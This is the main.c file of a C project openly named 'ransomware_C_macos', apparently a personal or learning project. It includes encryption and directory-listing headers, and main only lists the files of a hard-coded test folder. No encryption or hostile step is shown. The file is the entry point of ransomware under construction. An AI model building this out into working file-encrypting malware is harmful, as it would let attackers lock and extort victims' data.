//
//  main.c
//  ransomware_C_macos
//
//  Created by asap on 18/04/2024.
//

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include "encrypt_decrypt.h"
#include "list_dir.h"
#include "pile_depile.h"

Pile *initialisationPile();
void empiler(Pile *pile, int nvNombre);
int depiler(Pile *pile);
void afficherPile(Pile *pile);

int main(int argc, const char * argv[]) {
    
    
    char* location="/Users/asap/Documents/git/ransomware_C_macos/ransomware_C_macos/ransomware_C_macos/test";
    list_file_dir(location);
    
    
    return 0;
}
